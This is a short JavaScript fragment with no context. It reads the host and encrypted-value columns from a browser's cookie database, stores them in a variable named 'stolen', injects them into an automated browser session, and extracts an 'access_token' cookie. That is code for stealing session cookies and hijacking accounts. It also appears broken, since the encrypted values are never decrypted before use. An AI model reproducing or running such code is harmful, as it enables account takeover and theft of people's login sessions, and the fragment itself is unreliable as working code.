const query = "SELECT host_key, encrypted_value FROM cookies";
const stolen = db.execute(query);
await browser.addCookies(stolen);
const cookies = await page.cookies();
const token = cookies.find(c => c.name === 'access_token');
